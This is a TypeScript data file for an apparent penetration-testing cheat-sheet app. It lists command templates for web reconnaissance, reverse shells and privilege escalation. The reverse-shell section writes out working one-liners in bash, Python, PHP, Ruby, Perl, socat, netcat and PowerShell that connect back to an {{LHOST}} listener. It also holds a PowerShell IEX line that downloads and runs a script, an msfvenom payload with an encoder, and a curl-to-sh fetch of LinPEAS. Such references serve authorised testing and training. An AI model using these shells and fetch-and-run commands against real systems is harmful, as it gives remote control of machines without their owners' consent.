export interface ExtraOption {
  param: string;
  description: string;
}

export interface Template {
  id: string;
  title: string;
  category: string;
  subcategory: string;
  group: string;
  description: string;
  template: string;
  tags: string[];
  extraOptions?: ExtraOption[];
  isBrowser?: boolean;
}

export interface Category {
  id: string;
  name: string;
  icon: string;
  subcategories: Subcategory[];
}

export interface Subcategory {
  id: string;
  name: string;
  groups: string[];
  infoUrl?: string;
}

export const categories: Category[] = [
  {
    id: "web-enumeration",
    name: "Web Enumeration",
    icon: "Globe",
    subcategories: [
      { id: "web-osint", name: "OSINT", groups: [] },
      { id: "web-subdomain", name: "Subdomain Enumeration", groups: [] },
      { id: "web-directory", name: "Directory Enumeration", groups: [] },
    ],
  },
  {
    id: "reverse-shells",
    name: "Reverse Shells",
    icon: "Terminal",
    subcategories: [
      { id: "rs-linux", name: "Linux", groups: [] },
      { id: "rs-windows", name: "Windows", groups: [] },
    ],
  },
  {
    id: "privilege-escalation",
    name: "Privilege Escalation",
    icon: "TrendingUp",
    subcategories: [
      { id: "pe-linux", name: "Linux", groups: [] },
      { id: "pe-windows", name: "Windows", groups: [] },
      { id: "pe-transfer", name: "Transferring Files", groups: [], infoUrl: "https://medium.com/@inzelsec/linux-privilege-escalation-transferring-files-1810ff7ea7c5" },
    ],
  },
];

export const templates: Template[] = [
  // =============== Web Enumeration - OSINT ===============
  {
    id: "osint-whois",
    title: "WHOIS",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "whois {{URL}}",
    tags: ["osint", "whois", "domain"],
    extraOptions: [
      { param: "-h <server>", description: "Specify WHOIS server" },
      { param: "-p <port>", description: "Connect to specific port" },
    ],
  },
  {
    id: "osint-curl",
    title: "cURL Headers",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "curl -I https://{{URL}}",
    tags: ["osint", "curl", "banner"],
    extraOptions: [
      { param: "-k", description: "Ignore SSL certificate errors" },
      { param: "-L", description: "Follow redirects" },
      { param: "-v", description: "Verbose output" },
      { param: "-A <agent>", description: "Set User-Agent" },
      { param: "-x <proxy>", description: "Use proxy" },
    ],
  },
  {
    id: "osint-wafw00f",
    title: "Wafw00f",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "wafw00f {{URL}}",
    tags: ["osint", "waf", "firewall"],
    extraOptions: [
      { param: "-a", description: "Test all WAFs (not just first match)" },
      { param: "-v", description: "Verbose output" },
      { param: "-l", description: "List all detectable WAFs" },
    ],
  },
  {
    id: "osint-dnsdumpster",
    title: "DNSDumpster",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "https://dnsdumpster.com/",
    tags: ["osint", "dns", "web"],
    isBrowser: true,
  },
  {
    id: "osint-hunter",
    title: "Hunter.io",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "https://hunter.io/",
    tags: ["osint", "email", "web"],
    isBrowser: true,
  },
  {
    id: "osint-haveibeenpwned",
    title: "HaveIBeenPwned",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "https://haveibeenpwned.com/",
    tags: ["osint", "breach", "email"],
    isBrowser: true,
  },
  {
    id: "osint-theharvester",
    title: "theHarvester",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "theHarvester -d {{URL}} -b all",
    tags: ["osint", "harvester", "recon"],
    extraOptions: [
      { param: "-b google", description: "Use only Google" },
      { param: "-b bing", description: "Use only Bing" },
      { param: "-l 500", description: "Limit results to 500" },
      { param: "-s", description: "Use Shodan" },
      { param: "-f <file>", description: "Save to HTML/XML file" },
    ],
  },
  {
    id: "osint-nslookup",
    title: "nslookup",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "nslookup -type=A {{URL}} 1.1.1.1",
    tags: ["osint", "dns", "nslookup"],
    extraOptions: [
      { param: "-type=MX", description: "Query mail servers" },
      { param: "-type=TXT", description: "Query TXT records" },
      { param: "-type=NS", description: "Query name servers" },
      { param: "-type=AAAA", description: "Query IPv6 records" },
    ],
  },
  {
    id: "osint-dig",
    title: "dig",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "dig {{URL}} ANY +noall +answer",
    tags: ["osint", "dns", "dig"],
    extraOptions: [
      { param: "+short", description: "Short output" },
      { param: "@8.8.8.8", description: "Use Google DNS" },
      { param: "MX", description: "Query mail records" },
      { param: "TXT", description: "Query TXT records" },
      { param: "+trace", description: "Trace delegation path" },
    ],
  },
  {
    id: "osint-host",
    title: "host",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "host {{URL}}",
    tags: ["osint", "dns", "host"],
    extraOptions: [
      { param: "-t MX", description: "Query mail servers" },
      { param: "-t TXT", description: "Query TXT records" },
      { param: "-a", description: "Query all record types" },
    ],
  },
  {
    id: "osint-shodan-web",
    title: "Shodan (Web)",
    category: "web-enumeration",
    subcategory: "web-osint",
    group: "",
    description: "",
    template: "https://www.shodan.io/",
    tags: ["osint", "shodan", "web"],
    isBrowser: true,
  },

  // =============== Web Enumeration - Subdomain Enumeration ===============
  {
    id: "subdomain-crtsh-web",
    title: "crt.sh (Web)",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "https://crt.sh/?q={{URL}}",
    tags: ["subdomain", "certificate", "web"],
    isBrowser: true,
  },
  {
    id: "subdomain-crtsh-cli",
    title: "crt.sh (CLI)",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "curl -s \"https://crt.sh/?q={{URL}}&output=json\" | jq -r '.[] | select(.name_value | contains(\"dev\")) | .name_value' | sort -u",
    tags: ["subdomain", "certificate", "curl"],
  },
  {
    id: "subdomain-sublist3r",
    title: "Sublist3r",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "sublist3r -d {{URL}}",
    tags: ["subdomain", "passive", "sublist3r"],
    extraOptions: [
      { param: "-o <file>", description: "Save output to file" },
      { param: "-b", description: "Enable brute force" },
      { param: "-t <threads>", description: "Number of threads" },
      { param: "-e <engines>", description: "Specify search engines" },
    ],
  },
  {
    id: "subdomain-shodan",
    title: "Shodan",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "shodan search hostname:{{URL}}",
    tags: ["subdomain", "shodan", "servers"],
    extraOptions: [
      { param: "port:443", description: "Filter by port" },
      { param: "country:US", description: "Filter by country" },
      { param: "org:<name>", description: "Filter by organization" },
      { param: "--fields ip,port", description: "Show specific fields" },
    ],
  },
  {
    id: "subdomain-dnsenum",
    title: "dnsenum",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "dnsenum {{URL}}",
    tags: ["subdomain", "dns", "dnsenum"],
    extraOptions: [
      { param: "--threads <n>", description: "Number of threads" },
      { param: "-r", description: "Recursive brute force" },
      { param: "-o <file>", description: "Output to file" },
    ],
  },
  {
    id: "subdomain-dnsenum-brute",
    title: "dnsenum (Brute)",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "dnsenum --enum {{URL}} -f {{WORDLIST_PATH}}",
    tags: ["subdomain", "bruteforce", "dnsenum"],
  },
  {
    id: "subdomain-subfinder",
    title: "Subfinder",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "subfinder -d {{URL}} | anew subdomains.txt && cat subdomains.txt",
    tags: ["subdomain", "passive", "subfinder"],
    extraOptions: [
      { param: "-silent", description: "Silent mode (only subdomains)" },
      { param: "-t <n>", description: "Number of threads" },
      { param: "-timeout <s>", description: "Timeout in seconds" },
      { param: "-all", description: "Use all sources" },
    ],
  },
  {
    id: "subdomain-dnsrecon",
    title: "dnsrecon",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "dnsrecon -t brt -d {{URL}}",
    tags: ["subdomain", "bruteforce", "dnsrecon"],
    extraOptions: [
      { param: "-t std", description: "Standard enumeration" },
      { param: "-t axfr", description: "Zone transfer" },
      { param: "-D <file>", description: "Use custom wordlist" },
      { param: "--xml <file>", description: "XML output" },
    ],
  },
  {
    id: "subdomain-gobuster-dns",
    title: "Gobuster DNS",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "gobuster dns -d {{URL}} -w {{WORDLIST_PATH}}",
    tags: ["subdomain", "fuzzing", "gobuster"],
    extraOptions: [
      { param: "-t <n>", description: "Number of threads" },
      { param: "-i", description: "Show IPs" },
      { param: "-c", description: "Show CNAME records" },
      { param: "--timeout <s>", description: "DNS timeout" },
      { param: "-o <file>", description: "Output to file" },
    ],
  },
  {
    id: "subdomain-amass-active",
    title: "Amass (Active)",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "amass enum -brute -active -d {{URL}} | tee -a subdomains.txt",
    tags: ["subdomain", "active", "amass"],
    extraOptions: [
      { param: "-ip", description: "Show IP addresses" },
      { param: "-src", description: "Show data sources" },
      { param: "-o <file>", description: "Output to file" },
      { param: "-timeout <min>", description: "Timeout in minutes" },
    ],
  },
  {
    id: "subdomain-amass-passive",
    title: "Amass (Passive)",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "amass enum -brute -passive -d {{URL}} | tee -a subdomains.txt",
    tags: ["subdomain", "passive", "amass"],
  },
  {
    id: "subdomain-gobuster-vhost",
    title: "Gobuster VHost",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "gobuster vhost -u http://{{URL}} -w {{WORDLIST_PATH}} --append-domain",
    tags: ["subdomain", "vhost", "gobuster"],
    extraOptions: [
      { param: "-t <n>", description: "Number of threads" },
      { param: "--exclude-length <n>", description: "Exclude by response size" },
      { param: "-k", description: "Skip TLS verification" },
      { param: "-o <file>", description: "Output to file" },
    ],
  },
  {
    id: "subdomain-ffuf-vhost",
    title: "FFUF VHost",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "ffuf -u http://{{URL}} -w {{WORDLIST_PATH}} -H 'Host: FUZZ.{{URL}}' -c -v",
    tags: ["subdomain", "vhost", "ffuf"],
    extraOptions: [
      { param: "-fs <size>", description: "Filter by response size" },
      { param: "-fc <code>", description: "Filter by status code" },
      { param: "-fw <words>", description: "Filter by word count" },
      { param: "-fl <lines>", description: "Filter by line count" },
      { param: "-t <n>", description: "Number of threads" },
    ],
  },
  {
    id: "subdomain-aquatone",
    title: "Aquatone",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "cat subdomains.txt | aquatone",
    tags: ["subdomain", "screenshot", "aquatone"],
    extraOptions: [
      { param: "-ports <list>", description: "Custom ports (80,443,8080)" },
      { param: "-threads <n>", description: "Number of threads" },
      { param: "-out <dir>", description: "Output directory" },
      { param: "-timeout <ms>", description: "Timeout in milliseconds" },
    ],
  },
  {
    id: "subdomain-assetfinder",
    title: "Assetfinder",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "assetfinder --subs-only {{URL}}",
    tags: ["subdomain", "passive", "assetfinder"],
  },
  {
    id: "subdomain-httpx",
    title: "httpx (Validate)",
    category: "web-enumeration",
    subcategory: "web-subdomain",
    group: "",
    description: "",
    template: "cat subdomains.txt | httpx -silent",
    tags: ["subdomain", "validation", "httpx"],
    extraOptions: [
      { param: "-status-code", description: "Show status codes" },
      { param: "-title", description: "Show page titles" },
      { param: "-tech-detect", description: "Detect technologies" },
      { param: "-o live.txt", description: "Output to file" },
    ],
  },

  // =============== Web Enumeration - Directory Enumeration ===============
  {
    id: "dir-ffuf",
    title: "FFUF",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "ffuf -u http://{{URL}}/FUZZ -w {{WORDLIST_PATH}}",
    tags: ["directory", "fuzzing", "ffuf"],
    extraOptions: [
      { param: "-c", description: "Colorize output" },
      { param: "-v", description: "Verbose output" },
      { param: "-mc 200,301,302", description: "Match status codes" },
      { param: "-fc 403,404", description: "Filter status codes" },
      { param: "-fs <size>", description: "Filter by response size" },
      { param: "-t 50", description: "50 threads" },
      { param: "-recursion", description: "Enable recursion" },
      { param: "-recursion-depth 2", description: "Recursion depth" },
      { param: "-o results.json", description: "Output to JSON" },
    ],
  },
  {
    id: "dir-gobuster",
    title: "Gobuster",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "gobuster dir -u https://{{URL}} -w {{WORDLIST_PATH}}",
    tags: ["directory", "bruteforce", "gobuster"],
    extraOptions: [
      { param: "-x php,html,txt", description: "File extensions" },
      { param: "-k", description: "Skip SSL verification" },
      { param: "-t 50", description: "50 threads" },
      { param: "-s 200,301,302", description: "Show specific status" },
      { param: "-b 404,403", description: "Exclude status codes" },
      { param: "-r", description: "Follow redirects" },
      { param: "-o output.txt", description: "Output to file" },
      { param: "--no-error", description: "Hide errors" },
    ],
  },
  {
    id: "dir-feroxbuster",
    title: "Feroxbuster",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "feroxbuster -u https://{{URL}} -w {{WORDLIST_PATH}}",
    tags: ["directory", "bruteforce", "feroxbuster"],
    extraOptions: [
      { param: "-x php,html,txt", description: "Extensions to test" },
      { param: "-t 50", description: "50 threads" },
      { param: "-d 2", description: "Recursion depth" },
      { param: "--smart", description: "Smart filtering" },
      { param: "-o results.txt", description: "Output to file" },
      { param: "-k", description: "Ignore SSL errors" },
    ],
  },
  {
    id: "dir-ffuf-ext",
    title: "FFUF (Extensions)",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "ffuf -u http://{{URL}}/FUZZ -w {{WORDLIST_PATH}} -e .php,.html,.bak,.txt",
    tags: ["directory", "fuzzing", "files"],
    extraOptions: [
      { param: "-c", description: "Colorize output" },
      { param: "-v", description: "Verbose output" },
      { param: "-mc 200,301", description: "Match specific codes" },
      { param: "-fc 403,404", description: "Filter status codes" },
      { param: "-fs <size>", description: "Filter by size" },
      { param: "-t 50", description: "50 threads" },
      { param: "-recursion", description: "Enable recursion" },
    ],
  },
  {
    id: "dir-dirb",
    title: "Dirb",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "dirb https://{{URL}} {{WORDLIST_PATH}}",
    tags: ["directory", "bruteforce", "dirb"],
    extraOptions: [
      { param: "-o output.txt", description: "Output to file" },
      { param: "-r", description: "Non-recursive" },
      { param: "-z 100", description: "Delay 100ms between requests" },
      { param: "-a <agent>", description: "Custom User-Agent" },
      { param: "-p <proxy>", description: "Use proxy" },
    ],
  },
  {
    id: "dir-dirsearch",
    title: "Dirsearch",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "dirsearch -u https://{{URL}} -w {{WORDLIST_PATH}}",
    tags: ["directory", "bruteforce", "dirsearch"],
    extraOptions: [
      { param: "-e php,html,txt", description: "Extensions" },
      { param: "-t 50", description: "50 threads" },
      { param: "-r", description: "Recursive" },
      { param: "--exclude-status=404,403", description: "Exclude status codes" },
      { param: "-o output.txt", description: "Output to file" },
    ],
  },
  {
    id: "dir-waybackurls",
    title: "Waybackurls",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "echo {{URL}} | waybackurls | sort -u",
    tags: ["directory", "archive", "wayback"],
    extraOptions: [
      { param: "-dates", description: "Show capture dates" },
      { param: "-no-subs", description: "Exclude subdomains" },
    ],
  },
  {
    id: "dir-nikto",
    title: "Nikto",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "nikto -h https://{{URL}}",
    tags: ["directory", "scanner", "nikto"],
    extraOptions: [
      { param: "-ssl", description: "Force SSL" },
      { param: "-Tuning x", description: "Scan tuning" },
      { param: "-o output.html", description: "Output to HTML" },
      { param: "-Plugins all", description: "Run all plugins" },
    ],
  },
  {
    id: "dir-robots",
    title: "robots.txt",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "curl -s https://{{URL}}/robots.txt",
    tags: ["directory", "robots", "curl"],
  },
  {
    id: "dir-sitemap",
    title: "sitemap.xml",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "curl -s https://{{URL}}/sitemap.xml",
    tags: ["directory", "sitemap", "curl"],
  },
  {
    id: "dir-nuclei",
    title: "Nuclei",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "nuclei -u https://{{URL}}",
    tags: ["scanner", "vulnerabilities", "nuclei"],
    extraOptions: [
      { param: "-t cves/", description: "Scan for CVEs only" },
      { param: "-severity critical,high", description: "Filter by severity" },
      { param: "-o results.txt", description: "Output to file" },
      { param: "-silent", description: "Silent mode" },
      { param: "-rate-limit 50", description: "Rate limit requests" },
    ],
  },
  {
    id: "dir-katana",
    title: "Katana",
    category: "web-enumeration",
    subcategory: "web-directory",
    group: "",
    description: "",
    template: "katana -u https://{{URL}}",
    tags: ["crawler", "spider", "katana"],
    extraOptions: [
      { param: "-d 3", description: "Crawl depth" },
      { param: "-jc", description: "Enable JS crawling" },
      { param: "-o urls.txt", description: "Output to file" },
      { param: "-silent", description: "Silent mode" },
    ],
  },

  // =============== Reverse Shells - Linux ===============
  {
    id: "rs-listener",
    title: "Netcat Listener",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "Start listener on your machine to receive shell",
    template: "nc -lvnp {{PORT}}",
    tags: ["netcat", "listener", "linux"],
    extraOptions: [
      { param: "-k", description: "Keep listening after disconnect" },
    ],
  },
  {
    id: "rs-bash-tcp",
    title: "Bash TCP",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "bash -i >& /dev/tcp/{{LHOST}}/{{PORT}} 0>&1",
    tags: ["bash", "tcp", "linux"],
  },
  {
    id: "rs-python3",
    title: "Python3",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    tags: ["python", "socket", "linux"],
  },
  {
    id: "rs-php",
    title: "PHP",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "php -r '$sock=fsockopen(\"{{LHOST}}\",{{PORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    tags: ["php", "socket", "linux"],
  },
  {
    id: "rs-ruby",
    title: "Ruby",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{PORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    tags: ["ruby", "socket", "linux"],
  },
  {
    id: "rs-socat",
    title: "Socat",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "socat TCP:{{LHOST}}:{{PORT}} EXEC:/bin/bash",
    tags: ["socat", "tcp", "linux"],
    extraOptions: [
      { param: ",pty,stderr,setsid,sigint,sane", description: "Full TTY shell" },
    ],
  },
  {
    id: "rs-nc-e",
    title: "Netcat -e",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "nc -e /bin/sh {{LHOST}} {{PORT}}",
    tags: ["netcat", "nc", "linux"],
    extraOptions: [
      { param: "-v", description: "Verbose mode" },
      { param: "-n", description: "Skip DNS resolution" },
    ],
  },
  {
    id: "rs-nc-mkfifo",
    title: "Netcat mkfifo",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{PORT}} >/tmp/f",
    tags: ["netcat", "mkfifo", "linux"],
  },
  {
    id: "rs-perl",
    title: "Perl",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    tags: ["perl", "socket", "linux"],
  },
  {
    id: "rs-revshells",
    title: "revshells.com",
    category: "reverse-shells",
    subcategory: "rs-linux",
    group: "",
    description: "",
    template: "https://www.revshells.com/",
    tags: ["generator", "shells", "web"],
    isBrowser: true,
  },

  // =============== Reverse Shells - Windows ===============
  {
    id: "rs-ps-tcp",
    title: "PowerShell TCP",
    category: "reverse-shells",
    subcategory: "rs-windows",
    group: "",
    description: "",
    template: "$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
    tags: ["powershell", "tcp", "windows"],
  },
  {
    id: "rs-ps-iex",
    title: "PowerShell IEX",
    category: "reverse-shells",
    subcategory: "rs-windows",
    group: "",
    description: "",
    template: "powershell -c \"IEX(New-Object Net.WebClient).downloadString('http://{{LHOST}}:{{PORT}}/shell.ps1')\"",
    tags: ["powershell", "download", "windows"],
  },
  {
    id: "rs-cmd-ps",
    title: "CMD via PowerShell",
    category: "reverse-shells",
    subcategory: "rs-windows",
    group: "",
    description: "",
    template: "cmd /c powershell -ep bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'C:\\>' ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    tags: ["cmd", "powershell", "windows"],
  },
  {
    id: "rs-msfvenom-exe",
    title: "MSFVenom EXE",
    category: "reverse-shells",
    subcategory: "rs-windows",
    group: "",
    description: "",
    template: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{PORT}} -f exe -o shell.exe",
    tags: ["msfvenom", "payload", "windows"],
    extraOptions: [
      { param: "-e x86/shikata_ga_nai", description: "Encode payload" },
      { param: "-p windows/meterpreter/reverse_tcp", description: "Meterpreter payload" },
    ],
  },
  {
    id: "rs-nc-windows",
    title: "nc.exe",
    category: "reverse-shells",
    subcategory: "rs-windows",
    group: "",
    description: "",
    template: "nc.exe {{LHOST}} {{PORT}} -e cmd.exe",
    tags: ["netcat", "cmd", "windows"],
  },

  // =============== Privilege Escalation - Linux ===============
  {
    id: "pe-linux-sudo",
    title: "sudo -l",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "sudo -l",
    tags: ["sudo", "enumeration", "linux"],
  },
  {
    id: "pe-linux-suid",
    title: "Find SUID",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "find / -perm -4000 -type f 2>/dev/null",
    tags: ["suid", "enumeration", "linux"],
    extraOptions: [
      { param: "-perm -2000", description: "Find SGID files" },
      { param: "-user root", description: "Only root-owned files" },
    ],
  },
  {
    id: "pe-linux-cap",
    title: "Find Capabilities",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "getcap -r / 2>/dev/null",
    tags: ["capabilities", "enumeration", "linux"],
  },
  {
    id: "pe-linux-cron",
    title: "Cron Jobs",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "cat /etc/crontab && ls -la /etc/cron.*",
    tags: ["cron", "enumeration", "linux"],
  },
  {
    id: "pe-linux-passwd",
    title: "Writable /etc/passwd",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "ls -la /etc/passwd /etc/shadow",
    tags: ["passwd", "permissions", "linux"],
  },
  {
    id: "pe-linux-linpeas",
    title: "LinPEAS",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    tags: ["linpeas", "enumeration", "linux"],
  },
  {
    id: "pe-linux-uname",
    title: "Kernel Version",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "uname -a && cat /etc/*release",
    tags: ["kernel", "version", "linux"],
  },
  {
    id: "pe-linux-writable",
    title: "Writable Directories",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "find / -writable -type d 2>/dev/null",
    tags: ["writable", "directories", "linux"],
  },
  {
    id: "pe-linux-pspy",
    title: "pspy (Process Spy)",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "https://github.com/DominicBreuker/pspy/releases",
    tags: ["pspy", "processes", "linux"],
    isBrowser: true,
  },
  {
    id: "pe-linux-gtfobins",
    title: "GTFOBins",
    category: "privilege-escalation",
    subcategory: "pe-linux",
    group: "",
    description: "",
    template: "https://gtfobins.github.io/",
    tags: ["gtfobins", "reference", "linux"],
    isBrowser: true,
  },

  // =============== Privilege Escalation - Windows ===============
  {
    id: "pe-win-whoami",
    title: "whoami /priv",
    category: "privilege-escalation",
    subcategory: "pe-windows",
    group: "",
    description: "",
    template: "whoami /priv",
    tags: ["whoami", "privileges", "windows"],
    extraOptions: [
      { param: "/all", description: "All user info" },
      { param: "/groups", description: "Group memberships" },
    ],
  },
  {
    id: "pe-win-services",
    title: "WMIC Services",
    category: "privilege-escalation",
    subcategory: "pe-windows",
    group: "",
    description: "",
    template: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
    tags: ["services", "wmic", "windows"],
  },
  {
    id: "pe-win-alwaysinstall",
    title: "AlwaysInstallElevated",
    category: "privilege-escalation",
    subcategory: "pe-windows",
    group: "",
    description: "",
    template: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
    tags: ["registry", "msi", "windows"],
  },
  {
    id: "pe-win-winpeas",
    title: "WinPEAS",
    category: "privilege-escalation",
    subcategory: "pe-windows",
    group: "",
    description: "",
    template: "https://github.com/carlospolop/PEASS-ng/releases",
    tags: ["winpeas", "enumeration", "windows"],
    isBrowser: true,
  },
  {
    id: "pe-win-systeminfo",
    title: "systeminfo",
    category: "privilege-escalation",
    subcategory: "pe-windows",
    group: "",
    description: "",
    template: "systeminfo",
    tags: ["systeminfo", "enumeration", "windows"],
  },
  {
    id: "pe-win-netuser",
    title: "net user",
    category: "privilege-escalation",
    subcategory: "pe-windows",
    group: "",
    description: "",
    template: "net user && net localgroup administrators",
    tags: ["users", "groups", "windows"],
  },
  {
    id: "pe-win-cmdkey",
    title: "Saved Credentials",
    category: "privilege-escalation",
    subcategory: "pe-windows",
    group: "",
    description: "",
    template: "cmdkey /list",
    tags: ["credentials", "cmdkey", "windows"],
  },
  {
    id: "pe-win-lolbas",
    title: "LOLBAS",
    category: "privilege-escalation",
    subcategory: "pe-windows",
    group: "",
    description: "",
    template: "https://lolbas-project.github.io/",
    tags: ["lolbas", "reference", "windows"],
    isBrowser: true,
  },

  // =============== Privilege Escalation - Transferring Files ===============
  {
    id: "pe-transfer-python-server",
    title: "Python HTTP Server",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Start a simple HTTP server on your machine to serve files",
    template: "python3 -m http.server {{PORT}}",
    tags: ["transfer", "python", "http", "server"],
    extraOptions: [
      { param: "--bind <ip>", description: "Bind to specific IP address" },
      { param: "--directory <dir>", description: "Serve files from specific directory" },
    ],
  },
  {
    id: "pe-transfer-wget",
    title: "WGET Download",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Download file from attacker machine using wget",
    template: "wget http://{{LHOST}}:{{PORT}}/file.sh",
    tags: ["transfer", "wget", "download", "linux"],
    extraOptions: [
      { param: "-O <filename>", description: "Save with different filename" },
      { param: "-q", description: "Quiet mode" },
      { param: "--no-check-certificate", description: "Ignore SSL errors" },
    ],
  },
  {
    id: "pe-transfer-curl",
    title: "cURL Download",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Download file from attacker machine using curl",
    template: "curl http://{{LHOST}}:{{PORT}}/file.sh -o file.sh",
    tags: ["transfer", "curl", "download", "linux"],
    extraOptions: [
      { param: "-k", description: "Ignore SSL certificate errors" },
      { param: "-s", description: "Silent mode" },
      { param: "-L", description: "Follow redirects" },
    ],
  },
  {
    id: "pe-transfer-scp",
    title: "SCP Transfer",
    category: "privilege-escalation",
    subcategory: "pe-transfer",
    group: "",
    description: "Transfer file via SCP when you have SSH credentials",
    template: "scp file.sh user@{{RHOST}}:/tmp/file.sh",
    tags: ["transfer", "scp", "ssh", "linux"],
    extraOptions: [
      { param: "-P <port>", description: "Specify SSH port" },
      { param: "-i <key>", description: "Use identity file" },
      { param: "-r", description: "Recursive (for directories)" },
    ],
  },
  {
